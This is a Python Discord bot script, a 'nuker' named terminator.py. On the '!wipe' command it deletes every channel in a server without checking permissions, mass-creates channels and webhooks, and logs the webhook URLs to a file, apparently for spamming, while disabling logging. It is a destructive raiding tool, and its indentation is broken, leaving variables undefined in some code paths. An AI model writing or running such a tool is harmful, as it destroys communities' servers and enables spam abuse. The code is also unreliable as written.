import logging
import discord
import ctypes
import os
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")
ctypes.windll.kernel32.SetConsoleTitleW("terminator.py")

intents = discord.Intents.all()
client = discord.Client(intents=intents)
logging.disable(logging.CRITICAL)

@client.event
async def on_ready():
    print("bot ready, run '!wipe' in the server that has seen better days - arnold schwarzenegger")

@client.event
async def on_message(message):
    if message.content.startswith("!wipe"):
        guild = message.guild
        
        # delete all channels and categories
        for channel in guild.channels:
            await channel.delete()
            
        # create new channels
        num_channels = int(input("how many channels do you want to create? "))
        channel_name = input("enter channel name: ")
        webhook_name = input("enter webhook name: ")
        num_webhooks = int(input("how many webhooks do you want to create in each channel? "))
        
    webhook_urls = set()

    for i in range(num_channels):
            channel = await guild.create_text_channel(channel_name)

            for j in range(num_webhooks):
                webhook = await channel.create_webhook(name=webhook_name)
                webhook_urls.add(webhook.url)
                print(f"created webhook {webhook.name} in {channel.name}")

    with open("webhooks.txt", "a") as f:
            for url in webhook_urls:
                f.write(url + "\n")

client.run(TOKEN)
